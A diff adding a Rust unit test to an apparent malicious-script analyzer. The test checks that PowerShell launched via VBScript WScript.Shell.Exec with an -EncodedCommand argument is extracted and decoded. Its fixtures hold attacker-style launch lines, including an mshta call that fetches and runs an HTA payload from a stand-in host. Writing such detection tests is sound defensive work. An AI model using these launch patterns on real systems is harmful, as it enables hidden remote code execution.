@@ -20215,6 +20215,23 @@ sh.Exec "mshta vbs-exec.example/payload.hta""#;
     }
 
     #[test]
+    fn vbs_wscript_shell_parenthesized_exec_powershell_extracted() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+Set proc = sh.Exec("powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQBlAHgAZQBjAA==")"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-exec")),
+            "parenthesized VBS WScript.Shell.Exec PowerShell was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
     fn vbs_shell_application_shellexecute_schemeless_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Set sh = CreateObject("Shell.Application")
